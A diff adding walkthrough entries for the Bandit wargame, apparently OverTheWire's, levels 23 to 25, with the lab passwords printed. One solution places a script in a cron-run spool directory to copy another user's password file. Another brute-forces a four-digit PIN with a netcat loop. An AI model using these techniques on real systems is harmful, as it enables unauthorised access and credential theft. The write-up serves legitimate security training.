@@ -435,3 +435,44 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 password for bandit23:
 >QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+# Bandit Level 23 → Level 24
+
+## Level Goal
+
+A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+
+**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+## Solution 
+
+```bash
+nano /var/spool/bandit24/script.sh
+~~~~~~~~~~~~~~
+#!/bin/bash  
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+~~~~~~~~~~~~~~
+cat /tmp/bandit24_pass
+
+```
+
+password for bandit24:
+>VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+# Bandit Level 24 → Level 25
+
+## Level Goal
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+You do not need to create new connections each time
+
+## Solution
+
+```bash
+for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc 127.0.0.1 30002 | grep -v Wrong
+```
+
+password for bandit25:
+>p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
